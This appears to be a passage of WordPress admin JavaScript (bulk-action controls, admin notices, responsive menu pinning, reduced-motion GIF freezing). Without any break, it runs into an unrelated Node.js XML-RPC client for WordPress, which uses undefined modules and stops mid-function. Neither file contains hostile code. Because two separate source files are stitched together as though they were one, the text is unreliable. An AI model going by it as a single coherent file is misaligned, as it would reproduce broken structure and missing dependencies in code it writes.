		/**
		 * Updates the primary selector when the secondary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateTopSelector() {
			topSelector.val($(this).val());
		}
		bottomSelector.on('change', updateTopSelector);

		/**
		 * Updates the secondary selector when the primary selector is changed.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function updateBottomSelector() {
			bottomSelector.val($(this).val());
		}
		topSelector.on('change', updateBottomSelector);

		/**
		 * Triggers the primary submit when then secondary submit is clicked.
		 *
		 * @since 5.7.0
		 *
		 * @return {void}
		 */
		function triggerSubmitClick(e) {
			e.preventDefault();
			e.stopPropagation();

			topSubmit.trigger('click');
		}
		bottomSubmit.on('click', triggerSubmitClick);
	}

	// Marry the secondary "Bulk actions" controls to the primary controls:
	marryControls( $('#bulk-action-selector-top'), $('#doaction'), $('#bulk-action-selector-bottom'), $('#doaction2') );

	// Marry the secondary "Change role to" controls to the primary controls:
	marryControls( $('#new_role'), $('#changeit'), $('#new_role2'), $('#changeit2') );

	var addAdminNotice = function( data ) {
		var $notice = $( data.selector ),
			$headerEnd = $( '.wp-header-end' ),
			type,
			dismissible,
			$adminNotice;

		delete data.selector;

		dismissible = ( data.dismissible && data.dismissible === true ) ? ' is-dismissible' : '';
		type        = ( data.type ) ? data.type : 'info';

		$adminNotice = '<div id="' + data.id + '" class="notice notice-' + data.type + dismissible + '"><p>' + data.message + '</p></div>';

		// Check if this admin notice already exists.
		if ( ! $notice.length ) {
			$notice = $( '#' + data.id );
		}

		if ( $notice.length ) {
			$notice.replaceWith( $adminNotice );
		} else if ( $headerEnd.length ) {
			$headerEnd.after( $adminNotice );
		} else {
			if ( 'customize' === pagenow ) {
				$( '.customize-themes-notifications' ).append( $adminNotice );
			} else {
				$( '.wrap' ).find( '> h1' ).after( $adminNotice );
			}
		}

		$document.trigger( 'wp-notice-added' );
	};

	$( '.bulkactions' ).parents( 'form' ).on( 'submit', function( event ) {
		var form = this,
			submitterName = event.originalEvent && event.originalEvent.submitter ? event.originalEvent.submitter.name : false,
			currentPageSelector = form.querySelector( '#current-page-selector' );

		if ( currentPageSelector && currentPageSelector.defaultValue !== currentPageSelector.value ) {
			return; // Pagination form submission.
		}

		// Observe submissions from posts lists for 'bulk_action' or users lists for 'new_role'.
		var bulkFieldRelations = {
			'bulk_action' : window.bulkActionObserverIds.bulk_action,
			'changeit' : window.bulkActionObserverIds.changeit
		};
		if ( ! Object.keys( bulkFieldRelations ).includes( submitterName ) ) {
			return;
		}

		var values = new FormData(form);
		var value = values.get( bulkFieldRelations[ submitterName ] ) || '-1';

		// Check that the action is not the default one.
		if ( value !== '-1' ) {
			// Check that at least one item is selected.
			var itemsSelected = form.querySelectorAll( '.wp-list-table tbody .check-column input[type="checkbox"]:checked' );

			if ( itemsSelected.length > 0 ) {
				return;
			}
		}
		event.preventDefault();
		event.stopPropagation();
		$( 'html, body' ).animate( { scrollTop: 0 } );

		var errorMessage = __( 'Please select at least one item to perform this action on.' );
		addAdminNotice( {
			id: 'no-items-selected',
			type: 'error',
			message: errorMessage,
			dismissible: true,
		} );

		wp.a11y.speak( errorMessage );
	});

	/**
	 * Shows row actions on focus of its parent container element or any other elements contained within.
	 *
	 * @return {void}
	 */
	$( '#wpbody-content' ).on({
		focusin: function() {
			clearTimeout( transitionTimeout );
			focusedRowActions = $( this ).find( '.row-actions' );
			// transitionTimeout is necessary for Firefox, but Chrome won't remove the CSS class without a little help.
			$( '.row-actions' ).not( this ).removeClass( 'visible' );
			focusedRowActions.addClass( 'visible' );
		},
		focusout: function() {
			// Tabbing between post title and .row-actions links needs a brief pause, otherwise
			// the .row-actions div gets hidden in transit in some browsers (ahem, Firefox).
			transitionTimeout = setTimeout( function() {
				focusedRowActions.removeClass( 'visible' );
			}, 30 );
		}
	}, '.table-view-list .has-row-actions' );

	// Toggle list table rows on small screens.
	$( 'tbody' ).on( 'click', '.toggle-row', function() {
		$( this ).closest( 'tr' ).toggleClass( 'is-expanded' );
	});

	$('#default-password-nag-no').on( 'click', function() {
		setUserSetting('default_password_nag', 'hide');
		$('div.default-password-nag').hide();
		return false;
	});

	/**
	 * Handles tab keypresses in theme and plugin file editor textareas.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
	 */
	$('#newcontent').on('keydown.wpevent_InsertTab', function(e) {
		var el = e.target, selStart, selEnd, val, scroll, sel;

		// After pressing escape key (keyCode: 27), the tab key should tab out of the textarea.
		if ( e.keyCode == 27 ) {
			// When pressing Escape: Opera 12 and 27 blur form fields, IE 8 clears them.
			e.preventDefault();
			$(el).data('tab-out', true);
			return;
		}

		// Only listen for plain tab key (keyCode: 9) without any modifiers.
		if ( e.keyCode != 9 || e.ctrlKey || e.altKey || e.shiftKey )
			return;

		// After tabbing out, reset it so next time the tab key can be used again.
		if ( $(el).data('tab-out') ) {
			$(el).data('tab-out', false);
			return;
		}

		selStart = el.selectionStart;
		selEnd = el.selectionEnd;
		val = el.value;

		// If any text is selected, replace the selection with a tab character.
		if ( document.selection ) {
			el.focus();
			sel = document.selection.createRange();
			sel.text = '\t';
		} else if ( selStart >= 0 ) {
			scroll = this.scrollTop;
			el.value = val.substring(0, selStart).concat('\t', val.substring(selEnd) );
			el.selectionStart = el.selectionEnd = selStart + 1;
			this.scrollTop = scroll;
		}

		// Cancel the regular tab functionality, to prevent losing focus of the textarea.
		if ( e.stopPropagation )
			e.stopPropagation();
		if ( e.preventDefault )
			e.preventDefault();
	});

	// Reset page number variable for new filters/searches but not for bulk actions. See #17685.
	if ( pageInput.length ) {

		/**
		 * Handles pagination variable when filtering the list table.
		 *
		 * Set the pagination argument to the first page when the post-filter form is submitted.
		 * This happens when pressing the 'filter' button on the list table page.
		 *
		 * The pagination argument should not be touched when the bulk action dropdowns are set to do anything.
		 *
		 * The form closest to the pageInput is the post-filter form.
		 *
		 * @return {void}
		 */
		pageInput.closest('form').on( 'submit', function() {
			/*
			 * action = bulk action dropdown at the top of the table
			 */
			if ( $('select[name="action"]').val() == -1 && pageInput.val() == currentPage )
				pageInput.val('1');
		});
	}

	/**
	 * Resets the bulk actions when the search button is clicked.
	 *
	 * @return {void}
	 */
	$('.search-box input[type="search"], .search-box input[type="submit"]').on( 'mousedown', function () {
		$('select[name^="action"]').val('-1');
	});

	/**
	 * Scrolls into view when focus.scroll-into-view is triggered.
	 *
	 * @param {Event} e The event object.
	 *
	 * @return {void}
 	 */
	$('#contextual-help-link, #show-settings-link').on( 'focus.scroll-into-view', function(e){
		if ( e.target.scrollIntoViewIfNeeded )
			e.target.scrollIntoViewIfNeeded(false);
	});

	/**
	 * Disables the submit upload buttons when no data is entered.
	 *
	 * @return {void}
	 */
	(function(){
		var button, input, form = $('form.wp-upload-form');

		// Exit when no upload form is found.
		if ( ! form.length )
			return;

		button = form.find('input[type="submit"]');
		input = form.find('input[type="file"]');

		/**
		 * Determines if any data is entered in any file upload input.
		 *
		 * @since 3.5.0
		 *
		 * @return {void}
		 */
		function toggleUploadButton() {
			// When no inputs have a value, disable the upload buttons.
			button.prop('disabled', '' === input.map( function() {
				return $(this).val();
			}).get().join(''));
		}

		// Update the status initially.
		toggleUploadButton();
		// Update the status when any file input changes.
		input.on('change', toggleUploadButton);
	})();

	/**
	 * Pins the menu while distraction-free writing is enabled.
	 *
	 * @param {Event} event Event data.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function pinMenu( event ) {
		var windowPos = $window.scrollTop(),
			resizing = ! event || event.type !== 'scroll';

		if ( isIOS || $adminmenu.data( 'wp-responsive' ) ) {
			return;
		}

		/*
		 * When the menu is higher than the window and smaller than the entire page.
		 * It should be adjusted to be able to see the entire menu.
		 *
		 * Otherwise it can be accessed normally.
		 */
		if ( height.menu + height.adminbar < height.window ||
			height.menu + height.adminbar + 20 > height.wpwrap ) {
			unpinMenu();
			return;
		}

		menuIsPinned = true;

		// If the menu is higher than the window, compensate on scroll.
		if ( height.menu + height.adminbar > height.window ) {
			// Check for overscrolling, this happens when swiping up at the top of the document in modern browsers.
			if ( windowPos < 0 ) {
				// Stick the menu to the top.
				if ( ! pinnedMenuTop ) {
					pinnedMenuTop = true;
					pinnedMenuBottom = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}

				return;
			} else if ( windowPos + height.window > $document.height() - 1 ) {
				// When overscrolling at the bottom, stick the menu to the bottom.
				if ( ! pinnedMenuBottom ) {
					pinnedMenuBottom = true;
					pinnedMenuTop = false;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}

				return;
			}

			if ( windowPos > lastScrollPosition ) {
				// When a down scroll has been detected.

				// If it was pinned to the top, unpin and calculate relative scroll.
				if ( pinnedMenuTop ) {
					pinnedMenuTop = false;
					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar - ( windowPos - lastScrollPosition );

					if ( menuTop + height.menu + height.adminbar < windowPos + height.window ) {
						menuTop = windowPos + height.window - height.menu - height.adminbar;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuBottom && $adminMenuWrap.offset().top + height.menu < windowPos + height.window ) {
					// Pin it to the bottom.
					pinnedMenuBottom = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: 0
					});
				}
			} else if ( windowPos < lastScrollPosition ) {
				// When a scroll up is detected.

				// If it was pinned to the bottom, unpin and calculate relative scroll.
				if ( pinnedMenuBottom ) {
					pinnedMenuBottom = false;

					// Calculate new offset position.
					menuTop = $adminMenuWrap.offset().top - height.adminbar + ( lastScrollPosition - windowPos );

					if ( menuTop + height.menu > windowPos + height.window ) {
						menuTop = windowPos;
					}

					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else if ( ! pinnedMenuTop && $adminMenuWrap.offset().top >= windowPos + height.adminbar ) {

					// Pin it to the top.
					pinnedMenuTop = true;

					$adminMenuWrap.css({
						position: 'fixed',
						top: '',
						bottom: ''
					});
				}
			} else if ( resizing ) {
				// Window is being resized.

				pinnedMenuTop = pinnedMenuBottom = false;

				// Calculate the new offset.
				menuTop = windowPos + height.window - height.menu - height.adminbar - 1;

				if ( menuTop > 0 ) {
					$adminMenuWrap.css({
						position: 'absolute',
						top: menuTop,
						bottom: ''
					});
				} else {
					unpinMenu();
				}
			}
		}

		lastScrollPosition = windowPos;
	}

	/**
	 * Determines the height of certain elements.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function resetHeights() {
		height = {
			window: $window.height(),
			wpwrap: $wpwrap.height(),
			adminbar: $adminbar.height(),
			menu: $adminMenuWrap.height()
		};
	}

	/**
	 * Unpins the menu.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function unpinMenu() {
		if ( isIOS || ! menuIsPinned ) {
			return;
		}

		pinnedMenuTop = pinnedMenuBottom = menuIsPinned = false;
		$adminMenuWrap.css({
			position: '',
			top: '',
			bottom: ''
		});
	}

	/**
	 * Pins and unpins the menu when applicable.
	 *
	 * @since 4.1.0
	 *
	 * @return {void}
	 */
	function setPinMenu() {
		resetHeights();

		if ( $adminmenu.data('wp-responsive') ) {
			$body.removeClass( 'sticky-menu' );
			unpinMenu();
		} else if ( height.menu + height.adminbar > height.window ) {
			pinMenu();
			$body.removeClass( 'sticky-menu' );
		} else {
			$body.addClass( 'sticky-menu' );
			unpinMenu();
		}
	}

	if ( ! isIOS ) {
		$window.on( 'scroll.pin-menu', pinMenu );
		$document.on( 'tinymce-editor-init.pin-menu', function( event, editor ) {
			editor.on( 'wp-autoresize', resetHeights );
		});
	}

	/**
	 * Changes the sortables and responsiveness of metaboxes.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	window.wpResponsive = {

		/**
		 * Initializes the wpResponsive object.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		init: function() {
			var self = this;

			this.maybeDisableSortables = this.maybeDisableSortables.bind( this );

			// Modify functionality based on custom activate/deactivate event.
			$document.on( 'wp-responsive-activate.wp-responsive', function() {
				self.activate();
				self.toggleAriaHasPopup( 'add' );
			}).on( 'wp-responsive-deactivate.wp-responsive', function() {
				self.deactivate();
				self.toggleAriaHasPopup( 'remove' );
			});

			$( '#wp-admin-bar-menu-toggle a' ).attr( 'aria-expanded', 'false' );

			// Toggle sidebar when toggle is clicked.
			$( '#wp-admin-bar-menu-toggle' ).on( 'click.wp-responsive', function( event ) {
				event.preventDefault();

				// Close any open toolbar submenus.
				$adminbar.find( '.hover' ).removeClass( 'hover' );

				$wpwrap.toggleClass( 'wp-responsive-open' );
				if ( $wpwrap.hasClass( 'wp-responsive-open' ) ) {
					$(this).find('a').attr( 'aria-expanded', 'true' );
					$( '#adminmenu a:first' ).trigger( 'focus' );
				} else {
					$(this).find('a').attr( 'aria-expanded', 'false' );
				}
			} );

			// Close sidebar when target moves outside of toggle and sidebar.
			$( document ).on( 'click', function( event ) {
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) || ! document.hasFocus() ) {
					return;
				}

				var focusIsInToggle  = $.contains( $( '#wp-admin-bar-menu-toggle' )[0], event.target );
				var focusIsInSidebar = $.contains( $( '#adminmenuwrap' )[0], event.target );

				if ( ! focusIsInToggle && ! focusIsInSidebar ) {
					$( '#wp-admin-bar-menu-toggle' ).trigger( 'click.wp-responsive' );
				}
			} );

			// Close sidebar when a keypress completes outside of toggle and sidebar.
			$( document ).on( 'keyup', function( event ) {
				var toggleButton   = $( '#wp-admin-bar-menu-toggle' )[0];
				if ( ! $wpwrap.hasClass( 'wp-responsive-open' ) ) {
				    return;
				}
				if ( 27 === event.keyCode ) {
					$( toggleButton ).trigger( 'click.wp-responsive' );
					$( toggleButton ).find( 'a' ).trigger( 'focus' );
				} else {
					if ( 9 === event.keyCode ) {
						var sidebar        = $( '#adminmenuwrap' )[0];
						var focusedElement = event.relatedTarget || document.activeElement;
						// A brief delay is required to allow focus to switch to another element.
						setTimeout( function() {
							var focusIsInToggle  = $.contains( toggleButton, focusedElement );
							var focusIsInSidebar = $.contains( sidebar, focusedElement );

							if ( ! focusIsInToggle && ! focusIsInSidebar ) {
								$( toggleButton ).trigger( 'click.wp-responsive' );
							}
						}, 10 );
					}
				}
			});

			// Add menu events.
			$adminmenu.on( 'click.wp-responsive', 'li.wp-has-submenu > a', function( event ) {
				if ( ! $adminmenu.data('wp-responsive') ) {
					return;
				}
				let state = ( 'false' === $( this ).attr( 'aria-expanded' ) ) ? 'true' : 'false';
				$( this ).parent( 'li' ).toggleClass( 'selected' );
				$( this ).attr( 'aria-expanded', state );
				$( this ).trigger( 'focus' );
				event.preventDefault();
			});

			self.trigger();
			$document.on( 'wp-window-resized.wp-responsive', this.trigger.bind( this ) );

			// This needs to run later as UI Sortable may be initialized when the document is ready.
			$window.on( 'load.wp-responsive', this.maybeDisableSortables );
			$document.on( 'postbox-toggled', this.maybeDisableSortables );

			// When the screen columns are changed, potentially disable sortables.
			$( '#screen-options-wrap input' ).on( 'click', this.maybeDisableSortables );
		},

		/**
		 * Disable sortables if there is only one metabox, or the screen is in one column mode. Otherwise, enable sortables.
		 *
		 * @since 5.3.0
		 *
		 * @return {void}
		 */
		maybeDisableSortables: function() {
			var width = navigator.userAgent.indexOf('AppleWebKit/') > -1 ? $window.width() : window.innerWidth;

			if (
				( width <= 782 ) ||
				( 1 >= $sortables.find( '.ui-sortable-handle:visible' ).length && jQuery( '.columns-prefs-1 input' ).prop( 'checked' ) )
			) {
				this.disableSortables();
			} else {
				this.enableSortables();
			}
		},

		/**
		 * Changes properties of body and admin menu.
		 *
		 * Pins and unpins the menu and adds the auto-fold class to the body.
		 * Makes the admin menu responsive and disables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		activate: function() {
			setPinMenu();

			if ( ! $body.hasClass( 'auto-fold' ) ) {
				$body.addClass( 'auto-fold' );
			}

			$adminmenu.data( 'wp-responsive', 1 );
			this.disableSortables();
		},

		/**
		 * Changes properties of admin menu and enables metabox sortables.
		 *
		 * Pin and unpin the menu.
		 * Removes the responsiveness of the admin menu and enables the metabox sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		deactivate: function() {
			setPinMenu();
			$adminmenu.removeData('wp-responsive');

			this.maybeDisableSortables();
		},

		/**
		 * Toggles the aria-haspopup attribute for the responsive admin menu.
		 *
		 * The aria-haspopup attribute is only necessary for the responsive menu.
		 * See ticket https://core.trac.wordpress.org/ticket/43095
		 *
		 * @since 6.6.0
		 *
		 * @param {string} action Whether to add or remove the aria-haspopup attribute.
		 *
		 * @return {void}
		 */
		toggleAriaHasPopup: function( action ) {
			var elements = $adminmenu.find( '[data-ariahaspopup]' );

			if ( action === 'add' ) {
				elements.each( function() {
					$( this ).attr( 'aria-haspopup', 'menu' ).attr( 'aria-expanded', 'false' );
				} );

				return;
			}

			elements.each( function() {
				$( this ).removeAttr( 'aria-haspopup' ).removeAttr( 'aria-expanded' );
			} );
		},

		/**
		 * Sets the responsiveness and enables the overlay based on the viewport width.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		trigger: function() {
			var viewportWidth = getViewportWidth();

			// Exclude IE < 9, it doesn't support @media CSS rules.
			if ( ! viewportWidth ) {
				return;
			}

			if ( viewportWidth <= 782 ) {
				if ( ! wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-activate' );
					wpResponsiveActive = true;
				}
			} else {
				if ( wpResponsiveActive ) {
					$document.trigger( 'wp-responsive-deactivate' );
					wpResponsiveActive = false;
				}
			}

			if ( viewportWidth <= 480 ) {
				this.enableOverlay();
			} else {
				this.disableOverlay();
			}

			this.maybeDisableSortables();
		},

		/**
		 * Inserts a responsive overlay and toggles the window.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableOverlay: function() {
			if ( $overlay.length === 0 ) {
				$overlay = $( '<div id="wp-responsive-overlay"></div>' )
					.insertAfter( '#wpcontent' )
					.hide()
					.on( 'click.wp-responsive', function() {
						$toolbar.find( '.menupop.hover' ).removeClass( 'hover' );
						$( this ).hide();
					});
			}

			$toolbarPopups.on( 'click.wp-responsive', function() {
				$overlay.show();
			});
		},

		/**
		 * Disables the responsive overlay and removes the overlay.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableOverlay: function() {
			$toolbarPopups.off( 'click.wp-responsive' );
			$overlay.hide();
		},

		/**
		 * Disables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		disableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'disable' );
					$sortables.find( '.ui-sortable-handle' ).addClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		},

		/**
		 * Enables sortables.
		 *
		 * @since 3.8.0
		 *
		 * @return {void}
		 */
		enableSortables: function() {
			if ( $sortables.length ) {
				try {
					$sortables.sortable( 'enable' );
					$sortables.find( '.ui-sortable-handle' ).removeClass( 'is-non-sortable' );
				} catch ( e ) {}
			}
		}
	};

	/**
	 * Add an ARIA role `button` to elements that behave like UI controls when JavaScript is on.
	 *
	 * @since 4.5.0
	 *
	 * @return {void}
	 */
	function aria_button_if_js() {
		$( '.aria-button-if-js' ).attr( 'role', 'button' );
	}

	$( document ).on( 'ajaxComplete', function() {
		aria_button_if_js();
	});

	/**
	 * Get the viewport width.
	 *
	 * @since 4.7.0
	 *
	 * @return {number|boolean} The current viewport width or false if the
	 *                          browser doesn't support innerWidth (IE < 9).
	 */
	function getViewportWidth() {
		var viewportWidth = false;

		if ( window.innerWidth ) {
			// On phones, window.innerWidth is affected by zooming.
			viewportWidth = Math.max( window.innerWidth, document.documentElement.clientWidth );
		}

		return viewportWidth;
	}

	/**
	 * Sets the admin menu collapsed/expanded state.
	 *
	 * Sets the global variable `menuState` and triggers a custom event passing
	 * the current menu state.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	function setMenuState() {
		var viewportWidth = getViewportWidth() || 961;

		if ( viewportWidth <= 782  ) {
			menuState = 'responsive';
		} else if ( $body.hasClass( 'folded' ) || ( $body.hasClass( 'auto-fold' ) && viewportWidth <= 960 && viewportWidth > 782 ) ) {
			menuState = 'folded';
		} else {
			menuState = 'open';
		}

		$document.trigger( 'wp-menu-state-set', { state: menuState } );
	}

	// Set the menu state when the window gets resized.
	$document.on( 'wp-window-resized.set-menu-state', setMenuState );

	/**
	 * Sets ARIA attributes on the collapse/expand menu button.
	 *
	 * When the admin menu is open or folded, updates the `aria-expanded` and
	 * `aria-label` attributes of the button to give feedback to assistive
	 * technologies. In the responsive view, the button is always hidden.
	 *
	 * @since 4.7.0
	 *
	 * @return {void}
	 */
	$document.on( 'wp-menu-state-set wp-collapse-menu', function( event, eventData ) {
		var $collapseButton = $( '#collapse-button' ),
			ariaExpanded, ariaLabelText;

		if ( 'folded' === eventData.state ) {
			ariaExpanded = 'false';
			ariaLabelText = __( 'Expand Main menu' );
		} else {
			ariaExpanded = 'true';
			ariaLabelText = __( 'Collapse Main menu' );
		}

		$collapseButton.attr({
			'aria-expanded': ariaExpanded,
			'aria-label': ariaLabelText
		});
	});

	window.wpResponsive.init();
	setPinMenu();
	setMenuState();
	makeNoticesDismissible();
	aria_button_if_js();

	$document.on( 'wp-pin-menu wp-window-resized.pin-menu postboxes-columnchange.pin-menu postbox-toggled.pin-menu wp-collapse-menu.pin-menu wp-scroll-start.pin-menu', setPinMenu );

	// Set initial focus on a specific element.
	$( '.wp-initial-focus' ).trigger( 'focus' );

	// Toggle update details on update-core.php.
	$body.on( 'click', '.js-update-details-toggle', function() {
		var $updateNotice = $( this ).closest( '.js-update-details' ),
			$progressDiv = $( '#' + $updateNotice.data( 'update-details' ) );

		/*
		 * When clicking on "Show details" move the progress div below the update
		 * notice. Make sure it gets moved just the first time.
		 */
		if ( ! $progressDiv.hasClass( 'update-details-moved' ) ) {
			$progressDiv.insertAfter( $updateNotice ).addClass( 'update-details-moved' );
		}

		// Toggle the progress div visibility.
		$progressDiv.toggle();
		// Toggle the Show Details button expanded state.
		$( this ).attr( 'aria-expanded', $progressDiv.is( ':visible' ) );
	});
});

/**
 * Hides the update button for expired plugin or theme uploads.
 *
 * On the "Update plugin/theme from uploaded zip" screen, once the upload has expired,
 * hides the "Replace current with uploaded" button and displays a warning.
 *
 * @since 5.5.0
 */
$( function( $ ) {
	var $overwrite, $warning;

	if ( ! $body.hasClass( 'update-php' ) ) {
		return;
	}

	$overwrite = $( 'a.update-from-upload-overwrite' );
	$warning   = $( '.update-from-upload-expired' );

	if ( ! $overwrite.length || ! $warning.length ) {
		return;
	}

	window.setTimeout(
		function() {
			$overwrite.hide();
			$warning.removeClass( 'hidden' );

			if ( window.wp && window.wp.a11y ) {
				window.wp.a11y.speak( $warning.text() );
			}
		},
		7140000 // 119 minutes. The uploaded file is deleted after 2 hours.
	);
} );

// Fire a custom jQuery event at the end of window resize.
( function() {
	var timeout;

	/**
	 * Triggers the WP window-resize event.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function triggerEvent() {
		$document.trigger( 'wp-window-resized' );
	}

	/**
	 * Fires the trigger event again after 200 ms.
	 *
	 * @since 3.8.0
	 *
	 * @return {void}
	 */
	function fireOnce() {
		window.clearTimeout( timeout );
		timeout = window.setTimeout( triggerEvent, 200 );
	}

	$window.on( 'resize.wp-fire-once', fireOnce );
}());

// Make Windows 8 devices play along nicely.
(function(){
	if ( '-ms-user-select' in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/) ) {
		var msViewportStyle = document.createElement( 'style' );
		msViewportStyle.appendChild(
			document.createTextNode( '@-ms-viewport{width:auto!important}' )
		);
		document.getElementsByTagName( 'head' )[0].appendChild( msViewportStyle );
	}
})();

}( jQuery, window ));

/**
 * Freeze animated plugin icons when reduced motion is enabled.
 *
 * When the user has enabled the 'prefers-reduced-motion' setting, this module
 * stops animations for all GIFs on the page with the class 'plugin-icon' or
 * plugin icon images in the update plugins table.
 *
 * @since 6.4.0
 */
(function() {
	// Private variables and methods.
	var priv = {},
		pub = {},
		mediaQuery;

	// Initialize pauseAll to false; it will be set to true if reduced motion is preferred.
	priv.pauseAll = false;
	if ( window.matchMedia ) {
		mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
		if ( ! mediaQuery || mediaQuery.matches ) {
			priv.pauseAll = true;
		}
	}

	// Method to replace animated GIFs with a static frame.
	priv.freezeAnimatedPluginIcons = function( img ) {
		var coverImage = function() {
			var width = img.width;
			var height = img.height;
			var canvas = document.createElement( 'canvas' );

			// Set canvas dimensions.
			canvas.width = width;
			canvas.height = height;

			// Copy classes from the image to the canvas.
			canvas.className = img.className;

			// Check if the image is inside a specific table.
			var isInsideUpdateTable = img.closest( '#update-plugins-table' );

			if ( isInsideUpdateTable ) {
				// Transfer computed styles from image to canvas.
				var computedStyles = window.getComputedStyle( img ),
					i, max;
				for ( i = 0, max = computedStyles.length; i < max; i++ ) {
					var propName = computedStyles[ i ];
					var propValue = computedStyles.getPropertyValue( propName );
					canvas.style[ propName ] = propValue;
				}
			}

			// Draw the image onto the canvas.
			canvas.getContext( '2d' ).drawImage( img, 0, 0, width, height );

			// Set accessibility attributes on canvas.
			canvas.setAttribute( 'aria-hidden', 'true' );
			canvas.setAttribute( 'role', 'presentation' );

			// Insert canvas before the image and set the image to be near-invisible.
			var parent = img.parentNode;
			parent.insertBefore( canvas, img );
			img.style.opacity = 0.01;
			img.style.width = '0px';
			img.style.height = '0px';
		};

		// If the image is already loaded, apply the coverImage function.
		if ( img.complete ) {
			coverImage();
		} else {
			// Otherwise, wait for the image to load.
			img.addEventListener( 'load', coverImage, true );
		}
	};

	// Public method to freeze all relevant GIFs on the page.
	pub.freezeAll = function() {
		var images = document.querySelectorAll( '.plugin-icon, #update-plugins-table img' );
		for ( var x = 0; x < images.length; x++ ) {
			if ( /\.gif(?:\?|$)/i.test( images[ x ].src ) ) {
				priv.freezeAnimatedPluginIcons( images[ x ] );
			}
		}
	};

	// Only run the freezeAll method if the user prefers reduced motion.
	if ( true === priv.pauseAll ) {
		pub.freezeAll();
	}

	// Listen for jQuery AJAX events.
	( function( $ ) {
		if ( window.pagenow === 'plugin-install' ) {
			// Only listen for ajaxComplete if this is the plugin-install.php page.
			$( document ).ajaxComplete( function( event, xhr, settings ) {

				// Check if this is the 'search-install-plugins' request.
				if ( settings.data && typeof settings.data === 'string' && settings.data.includes( 'action=search-install-plugins' ) ) {
					// Recheck if the user prefers reduced motion.
					if ( window.matchMedia ) {
						var mediaQuery = window.matchMedia( '(prefers-reduced-motion: reduce)' );
						if ( mediaQuery.matches ) {
							pub.freezeAll();
						}
					} else {
						// Fallback for browsers that don't support matchMedia.
						if ( true === priv.pauseAll ) {
							pub.freezeAll();
						}
					}
				}
			} );
		}
	} )( jQuery );

	// Expose public methods.
	return pub;
})();
// http://codex.wordpress.org/XML-RPC_Support
// http://codex.wordpress.org/XML-RPC_WordPress_API

function extend( a, b ) {
	for ( var p in b ) {
		a[ p ] = b[ p ];
	}

	return a;
}

function parseArguments( args ) {
	return [].slice.call( args, 1 )

		// Remove null arguments
		// Null values only exist for optional fields. As of WordPress 4.4,
		// null is no longer treated the same as omitting the value. To
		// compensate for this, we just drop the argument before calling
		// into WordPress. See #25.
		.filter(function( value ) {
			return value !== null;
		});
}

function Client( settings ) {
	[ "url", "username", "password" ].forEach(function( prop ) {
		if ( !settings[prop] ) {
			throw new Error( "Missing required setting: " + prop );
		}
	});

	var parsedUrl = Client.parseUrl( settings.url );
	this.rpc = xmlrpc[ parsedUrl.secure ? "createSecureClient" : "createClient" ]({
		host: settings.host || parsedUrl.host,
		port: parsedUrl.port,
		path: parsedUrl.path,
		rejectUnauthorized: settings.rejectUnauthorized !== undefined ? settings.rejectUnauthorized : true,
		servername: settings.host || parsedUrl.host,

		// Always set Host header in case we're pointing to a different server
		// via settings.host
		headers: {
			Host: parsedUrl.host
		},
		basic_auth: !settings.basicAuth ? null : {
			user: settings.basicAuth.username,
			pass: settings.basicAuth.password
		}
	});
	this.blogId = settings.blogId || 0;
	this.username = settings.username;
	this.password = settings.password;
}

Client.parseUrl = function( wpUrl ) {
	var urlParts, secure;

	// allow URLs without a protocol
	if ( !(/\w+:\/\//.test( wpUrl ) ) ) {
		wpUrl = "http://" + wpUrl;
	}
	urlParts = url.parse( wpUrl );
	secure = urlParts.protocol === "https:";

	return {
		host: urlParts.hostname,
		port: urlParts.port || (secure ? 443 : 80),
		path: urlParts.path.replace( /\/+$/, "" ) + "/xmlrpc.php",
		secure: secure
	};
};

extend( Client.prototype, {
	call: function( method ) {
		var args = parseArguments( arguments ),
			fn = args.pop();

		if ( typeof fn !== "function" ) {
			args.push( fn );
			fn = null;
		}

		this.rpc.methodCall( method, args, function( error, data ) {
			if ( !error ) {
				return fn( null, data );
			}

			if ( error.code === "ENOTFOUND" && error.syscall === "getaddrinfo" ) {
				error.message = "Unable to connect to WordPress.";
			} else if ( error.message === "Unknown XML-RPC tag 'TITLE'" ) {
				var additional = error.res.statusCode;
				if (error.res.statusMessage) {
					additional += "; " + error.res.statusMessage;
				}

				error.message = "(" + additional + ") " + error.message;
			}

			fn( error );
		});
	},

	authenticatedCall: function() {
		var args = [].slice.call( arguments );
		args.splice( 1, 0, this.blogId, this.username, this.password );
		this.call.apply( this, args );
	},

	listMethods: function( fn ) {
		this.call( "system.listMethods", fn );
	}
});

extend( Client.prototype, {
	getPost: function( id, fields, fn ) {
		if ( typeof fields === "function" ) {
			fn = fields;
			fields = null;
		}

		if ( fields ) {
			fields = fieldMap.array( fields, "post" );
		}

		this.authenticatedCall( "wp.getPost", id, fields, function( error, post ) {
